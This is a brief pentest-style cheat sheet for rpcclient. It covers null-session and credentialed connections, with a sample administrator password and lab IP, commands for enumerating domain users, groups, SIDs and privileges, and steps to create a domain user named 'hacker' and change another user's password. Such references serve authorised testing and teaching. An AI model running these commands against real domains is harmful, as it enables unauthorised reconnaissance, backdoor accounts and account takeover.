## Remote Procedure Call (RPC)

```
rpcclient -U "" <IP>
rpcclient -U "" -N <IP>
rpcclient -U <USERNAME>%<PASSWORD> <IP>
rpcclient -U Administrator%Ignite@123 192.168.1.172
```

>rpcclient $>  

Domain Information Query
```
querydominfo
enumdom
enumdomains
dsr_enumtrustdom
getdompwinfo
```
Domain Controller Query
```
srvinfo
lsaquery
```
Group Query
```
enumdomgroups 
enumalsgroups builtin
querygroupmem519
queryaliasmem builtin 0x220
querygroup 0x200
```
User Query
```
enumdomusers
querydispinfo
queryuser RID
queryuser <USERNAME>
lookupsids SID
enumprivs
```
Create Domain User
```
createdomuser hacker 
setuserinfo2 hacker 24 Password@1 
enumdomusers
```
>Info level 24 sets only the user's password without modifying any other account details

Note: Misconfigured Settings/Privilege Account can create domain user

Change User Password
```
chgpasswd <USER> <CURRENT_PASSWORD> <NEW_PASSWORD>
chgpasswd raj Password@1 Password@987
```
